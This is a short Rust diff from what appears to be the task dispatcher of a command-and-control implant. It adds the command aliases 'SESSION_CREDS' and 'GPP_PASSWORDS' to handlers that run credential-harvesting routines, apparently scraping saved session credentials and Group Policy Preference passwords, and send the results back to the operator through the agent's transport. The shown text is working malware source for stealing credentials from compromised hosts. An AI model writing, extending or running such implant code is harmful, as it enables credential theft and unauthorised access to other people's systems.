@@ -821,13 +821,13 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
         }
 
         // ── SESSION_GOPHER ───────────────────────────────────────────────────
-        "SESSION_GOPHER" => {
+        "SESSION_GOPHER" | "SESSION_CREDS" => {
             t.send_result(task.id, &session_gopher(), "");
             true
         }
 
         // ── GPP_HUNT ─────────────────────────────────────────────────────────
-        "GPP_HUNT" => {
+        "GPP_HUNT" | "GPP_PASSWORDS" => {
             t.send_result(task.id, &gpp_hunt(), "");
             true
         }
